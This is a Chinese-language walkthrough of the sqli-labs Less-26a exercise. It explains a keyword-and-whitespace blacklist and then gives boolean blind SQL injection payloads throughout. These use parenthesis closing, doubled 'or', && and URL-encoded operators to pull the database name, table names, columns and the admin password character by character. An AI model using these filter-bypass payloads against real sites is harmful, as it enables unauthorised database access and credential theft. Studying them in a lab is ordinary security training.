# Less-26a （空格+注释全禁 + 括号闭合 + 盲注）

## 查看分析源码

和 Less-26 一样的黑名单，多了一个括号闭合，少了报错：

```php
$id= preg_replace('/or/i',"", $id);        // 去掉 or
$id= preg_replace('/and/i',"", $id);       // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);     // 去掉 /*
$id= preg_replace('/[--]/',"", $id);       // 去掉 --
$id= preg_replace('/[#]/',"", $id);        // 去掉 #
$id= preg_replace('/[\s]/',"", $id);       // 去掉空格 Tab 换行（\s ×2）
$id= preg_replace('/[\s]/',"", $id);       // 再来一次
$id= preg_replace('/[\/\\]/',"", $id);    // 去掉 / 和 \
```

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
// print_r(mysql_error());       // 没报错
```

Less-26 的套路照搬，三个差异要处理：
- 括号闭合：用 `')` 而不是 `'`
- 无报错：不能 updatexml 爆，只能**布尔盲注**
- `=` 在 URL 里会被当参数分隔符 → 全部写成 `%3d`

`or` 和 `and` 被替换为空 → 双写或 `||` / `%26%26`
`--` `#` `/*` 全禁 → 不能注释
`\s` 全禁 → 空格 Tab 换行全废，用 `()` 包裹替代

语法上注意：`FROM(users)` 能用，但 `LIMIT(0,1)` 带括号不行（`LIMIT` 不是函数）。解法：用 `GROUP_CONCAT` + `SUBSTR` 直接定位字符，不用 LIMIT。

## 布尔盲注原理

`id=1')&&(条件)&&('1`

条件真 → 返回 Dumb 的数据
条件假 → 不返回数据

```
?id=1')&&(1)&&('1     ← 返回数据
?id=1')&&(0)&&('1     ← 不返回
```

## 判断库名

库名 security，逐个字符比对：

```
?id=1')&&((select(substr(database(),1,1)))='s')&&('1
?id=1')&&((select(substr(database(),2,1)))='e')&&('1
```

全对的话长度 8：`database()` 要用 `%3d` 而不是 `=`：

```
?id=1')&&((select(length(database())))=8)&&('1
```

## 爆表名

注意 `infoorrmation` 里的 `or` 要双写：

```
?id=1')&&((select(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema%3ddatabase())),1,1)))='e')&&('1
```

全表名：`emails,referers,uagents,users`
位置从 1 开始，逐个加 `substr(str,N,1)`：

```
...substr((...group_concat...),1,1)='e'  ← emails的e
...substr((...group_concat...),8,1)='r'  ← referers的r
...substr((...group_concat...),16,1)='u' ← uagents的u
...substr((...group_concat...),24,1)='u' ← users的u
```

## 爆列名

```
?id=1')&&((select(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema%3ddatabase())%26%26(table_name%3d'users')),1,1)))='i')&&('1
```

## 爆数据

注意 `password` 里的 `or` → `passwoorrd`：

```
?id=1')&&((select(substr((select(group_concat(passwoorrd))from(users)where(username%3d'admin')),1,1)))='a')&&('1
```

## 完整盲注流程

```
数据库名：security（8位）
表名：emails,referers,uagents,users
users列：id,username,password
users数据：Dumb/Dumb, Angelina/I-kill-you, ... admin/admin
```

每爆一个字符手动改 `substr(str,N,1)` 里的 N，比较字符。这是个手工活，嫌慢可以用脚本二分法猜 ASCII 码：

```
?id=1')&&(ascii(substr((select(group_concat(passwoorrd))from(users)where(username%3d'admin')),1,1))>97)&&('1
```
